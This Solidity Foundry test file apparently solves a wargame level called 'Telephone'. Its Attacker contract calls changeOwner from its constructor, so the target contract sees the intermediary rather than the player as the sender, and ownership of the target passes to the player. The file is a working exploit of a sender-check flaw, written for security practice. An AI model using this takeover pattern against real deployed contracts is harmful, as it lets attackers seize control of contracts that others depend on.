// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneTest is Test {
    Telephone target;
    address player;

    function setUp() public {
        target = new Telephone();
        player = makeAddr("player");
        vm.deal(player, 1 ether);
    }

    function attack() private {
        new Attacker(address(target));
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        // must be the owner
        assertEq(target.owner(), player, "must be the owner");
    }
}

contract Attacker {
    Telephone target;

    constructor(address _target) {
        target = Telephone(_target);

        // the msg.sender of this contract is our player
        // but the msg.sender from the target's perspective is this contract
        target.changeOwner(msg.sender);
    }
}
